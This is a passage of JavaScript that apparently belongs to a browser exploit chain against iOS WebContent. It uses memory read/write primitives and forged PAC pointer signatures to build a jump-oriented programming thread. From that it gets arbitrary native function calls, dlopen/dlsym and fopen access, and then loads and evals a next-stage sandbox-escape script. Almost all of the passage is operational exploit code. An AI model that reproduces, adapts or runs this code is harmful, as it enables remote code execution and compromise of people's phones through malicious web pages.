          const paciza_gadget_control_2 = await slow_pacia(gadget_control_2, 0n);
          print(`paciza_gadget_control_2: ${paciza_gadget_control_2.hex()}`);
          const paciza_gadget_control_3 = await slow_pacia(gadget_control_3, 0n);
          print(`paciza_gadget_control_3: ${paciza_gadget_control_3.hex()}`);
          const paciza_gadget_control_3_4 = await slow_pacia(gadget_control_3 + 4n, 0n);
          print(`paciza_gadget_control_3_4: ${paciza_gadget_control_3_4.hex()}`);
          const paciza_gadget_set_all_registers = await slow_pacia(gadget_set_all_registers, 0n);
          print(`paciza_gadget_set_all_registers: ${paciza_gadget_set_all_registers.hex()}`);
          const jop_thread = new BigUint64Array(0x20 / 8);
          const jop_thread_data_ptr = jop_thread.data();
          const x0_u64 = new BigUint64Array(0x20 / 8);
          const x0 = x0_u64.data();
          x0_u64[8 / 8] = paciza_gadget_loop_3;
          await slow_fcall_2(signed_pthread_create, jop_thread_data_ptr, 0n, paciza_gadget_loop_3, x0);
          print('WebContent fcall thread has been spawned!!');
          const pthread_node = jop_thread[0];
          print(`pthread_node:${pthread_node.hex()}`);
          const jop_stack_top = p.read64(pthread_node + 0xb8n);
          print(`jop_stack_top:${jop_stack_top.hex()}`);
          const jop_stack_bottom = jop_stack_top + 0x88000n;
          print(`jop_stack_bottom:${jop_stack_bottom.hex()}`);
          const x19_u64 = new BigUint64Array(0x500 / 8);
          const x19_f64 = new Float64Array(x19_u64.buffer);
          const x19 = x19_u64.data();
          print(`x19: ${x19.hex()}`);
          const x22_u64 = new BigUint64Array(0x20 / 8);
          const x22 = x22_u64.data();
          print(`x22: ${x22.hex()}`);
          const x20_u64 = new BigUint64Array(0x30 / 8);
          const x20 = x20_u64.data();
          print(`x20: ${x20.hex()}`);
          const stack_u64 = new BigUint64Array(0x88000 / 8);
          const stack = stack_u64.data();
          print(`stack: ${stack.hex()}`);
          const paciza_gadget_control_1 = await slow_pacia(gadget_control_1, 0n);
          print(`paciza_gadget_control_1: ${paciza_gadget_control_1.hex()}`);
          const pacib_gadget_loop_1_0x80020 = await slow_pacib(gadget_loop_1, stack + 0x80020n);
          print(`pacib_gadget_loop_1_0x80020: ${pacib_gadget_loop_1_0x80020.hex()}`);
          const pacib_gadget_loop_1_0x800c0 = await slow_pacib(gadget_loop_1, stack + 0x800c0n);
          print(`pacib_gadget_loop_1_0x800c0: ${pacib_gadget_loop_1_0x800c0.hex()}`);
          const pacib_gadget_loop_2_0x80010 = await slow_pacib(gadget_loop_2, stack + 0x80010n);
          print(`pacib_gadget_loop_2_0x80010: ${pacib_gadget_loop_2_0x80010.hex()}`);
          const pacib_gadget_loop_2_0x800b0 = await slow_pacib(gadget_loop_2, stack + 0x800b0n);
          print(`pacib_gadget_loop_2_0x800b0: ${pacib_gadget_loop_2_0x800b0.hex()}`);
          const MAGIC = 123.456;
          p.write64(jop_stack_bottom - 0x4fa0n, stack + 0x80000n);
          p.write64(jop_stack_bottom - 0x4f98n, await slow_pacib(gadget_loop_1, jop_stack_top + 0x83070n));
          p.write64(jop_stack_bottom - 0x4fb0n, x20);
          p.write64(jop_stack_bottom - 0x4fa8n, x19);
          p.write64(jop_stack_bottom - 0x4fc0n, x22);
          x19_f64[0x20 / 8] = MAGIC;
          x19_u64[0 / 8] = paciza_gadget_loop_1;
          x0_u64[8 / 8] = paciza_gadget_control_1;
          while (x19_f64[0x20 / 8] === MAGIC);
          stack_u64[0x80008 / 8] = pacib_gadget_loop_2_0x80010;
          x19_f64[8 / 8] = MAGIC;
          x20_u64[0x10 / 8] = paciza_gadget_loop_2;
          x19_u64[0 / 8] = paciza_gadget_control_2;
          while (x19_f64[8 / 8] == MAGIC);
          x20_u64[0x20 / 8] = paciza_malloc;
          x20_u64[0x28 / 8] = 0n;
          stack_u64[0x80018 / 8] = pacib_gadget_loop_1_0x80020;
          x19_f64[0x20 / 8] = MAGIC;
          x19_u64[0 / 8] = paciza_gadget_loop_1;
          x20_u64[0x10 / 8] = paciza_gadget_control_3;
          while (x19_f64[0x20 / 8] === MAGIC);
          stack_u64[0x800a8 / 8] = pacib_gadget_loop_2_0x800b0;
          x19_f64[8 / 8] = MAGIC;
          x20_u64[0x10 / 8] = paciza_gadget_loop_2;
          x19_u64[0 / 8] = paciza_gadget_set_all_registers;
          while (x19_f64[8 / 8] === MAGIC);
          stack_u64[0x800b0 / 8] = stack + 0x80000n;
          stack_u64[0x800b8 / 8] = pacib_gadget_loop_1_0x800c0;
          x19_f64[0x20 / 8] = MAGIC;
          x19_u64[0 / 8] = paciza_gadget_loop_1;
          x20_u64[0x10 / 8] = paciza_gadget_control_3_4;
          while (x19_f64[0x20 / 8] === MAGIC);
          const cache = new Map();
          const signPointer = paciza_signPointer.noPAC();
          cache.set(signPointer, paciza_signPointer);
          function pacia(ptr, ctx) {
            signPointer_self[0] = 0x80010000_00000000n | ctx >> 48n << 32n;
            return fcall(signPointer, signPointer_self_addr, ctx, ptr);
          }
          function fcall(pc, ...args) {
            if (!cache.has(pc)) {
              cache.set(pc, pacia(pc, 0n));
            }
            const signed_pc = cache.get(pc);
            stack_u64[0x80008 / 8] = pacib_gadget_loop_2_0x80010;
            x19_f64[8 / 8] = MAGIC;
            x20_u64[0x10 / 8] = paciza_gadget_loop_2;
            performance.now();
            x19_u64[0 / 8] = paciza_gadget_control_2;
            while (x19_f64[8 / 8] === MAGIC);
            x20_u64[0x20 / 8] = signed_pc;
            x20_u64[0x28 / 8] = 0n;
            stack_u64[0x80018 / 8] = pacib_gadget_loop_1_0x80020;
            x19_f64[0x20 / 8] = MAGIC;
            x19_u64[0 / 8] = paciza_gadget_loop_1;
            performance.now();
            x20_u64[0x10 / 8] = paciza_gadget_control_3;
            while (x19_f64[0x20 / 8] === MAGIC);
            for (let i = 0; i < args.length && i < 8; ++i) {
              stack_u64[0x80098 / 8 - i] = args[i];
            }
            stack_u64[0x800a8 / 8] = pacib_gadget_loop_2_0x800b0;
            x19_f64[8 / 8] = MAGIC;
            x20_u64[0x10 / 8] = paciza_gadget_loop_2;
            performance.now();
            x19_u64[0 / 8] = paciza_gadget_set_all_registers;
            while (x19_f64[8 / 8] === MAGIC);
            x19_f64[0x20 / 8] = MAGIC;
            x19_u64[0 / 8] = paciza_gadget_loop_1;
            performance.now();
            x20_u64[0x10 / 8] = paciza_gadget_control_3_4;
            while (x19_f64[0x20 / 8] === MAGIC);
            return x19_u64[0x20 / 8];
          }
          const unsigned_dlopen = paciza_dlopen.noPAC();
          const unsigned_dlsym = paciza_dlsym.noPAC();
          function dlopen(filename, flags) {
            filename = filename + '\0';
            resolve_rope(filename);
            const name_ptr = p.read64(p.read64(p.addrof(filename) + 8n) + 8n);
            return fcall(unsigned_dlopen, name_ptr, flags);
          }
          p.dlopen = dlopen;
          function dlsym(handle, symbol) {
            symbol = symbol + '\0';
            resolve_rope(symbol);
            const symbol_ptr = p.read64(p.read64(p.addrof(symbol) + 8n) + 8n);
            return fcall(unsigned_dlsym, handle, symbol_ptr);
          }
          p.dlsym = dlsym;
          const libsystem_c = dlopen('/usr/lib/system/libsystem_c.dylib', 1n);
          const fopen = dlsym(libsystem_c, 'fopen').noPAC();
          const fopen_mode_str = 'w';
          const fopen_mode_ptr = p.read64(p.read64(p.addrof(fopen_mode_str) + 8n) + 8n);
          function log(msg) {
            if (true) {
              const elapsed = parseInt(Date.now() - rce_begin);
              const path = ("/(" + elapsed + ") ").padEnd(15) + msg.toString().replaceAll('/', '|') + '\0';
              resolve_rope(path);
              const path_ptr = p.read64(p.read64(p.addrof(path) + 8n) + 8n);
              fcall(fopen, path_ptr, fopen_mode_ptr);
            }
          }
          offsets.libsystem_kernel__thread_terminate = p.slide + 0x1D3D6F244n;
          function suspend_worker(worker) {
            const port = p.read32(worker.thread + 0x34n);
            return fcall(offsets.libsystem_kernel__thread_suspend, port);
          }
          for (const worker of p.dlopen_workers) {
            suspend_worker(worker);
          }
          function fcall_close() {
            x19_u64[0 / 8] = pacia(offsets.pthread_exit, 0n);
          }
          const rce_end = Date.now();
          log(`-`.repeat(0x28));
          try {
            // local version
            const sbx0_script = getJS('/sbx0_main_18.4.js');
            log("after get js");
            eval(sbx0_script);
        } catch (e) {
            log(btoa(e));
        }
          fcall_close();
          print(`all done`);
          self.postMessage({
            type: 'redirect'
          });
          return;
        }
      case 'slow_fcall_done':
        {
          slow_fcall_resolve(p.slowFcallResult[0]);
          break;
        }
    }
  };
})();
